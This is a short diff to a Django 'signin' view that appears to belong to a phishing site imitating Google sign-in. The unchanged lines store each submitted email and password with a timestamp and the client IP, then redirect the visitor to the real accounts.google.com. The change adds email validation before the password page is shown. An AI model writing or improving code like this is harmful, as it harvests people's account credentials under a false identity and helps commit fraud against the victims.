@@ -1,5 +1,7 @@
 from django.http import JsonResponse
 from django.shortcuts import render, HttpResponsePermanentRedirect
+from django.core.validators import validate_email
+from django.core.exceptions import ValidationError
 from datetime import datetime
 
 from .models import SignIn
@@ -33,8 +35,11 @@ def signin(request):
                     password).strip(), date_time=datetime.now(), client_ip=client_ip).save()
                 return HttpResponsePermanentRedirect(f'https://accounts.google.com?authuser={email}')
             elif email:
-                email = email.split('@')[0] + '@gmail.com'
-                return render(request, 'passwd.html', {'email': email})
+                try:
+                    validate_email(email)
+                    return render(request, 'passwd.html', {'email': email})
+                except ValidationError:
+                    pass
 
         return index(request)
     except Exception as e:
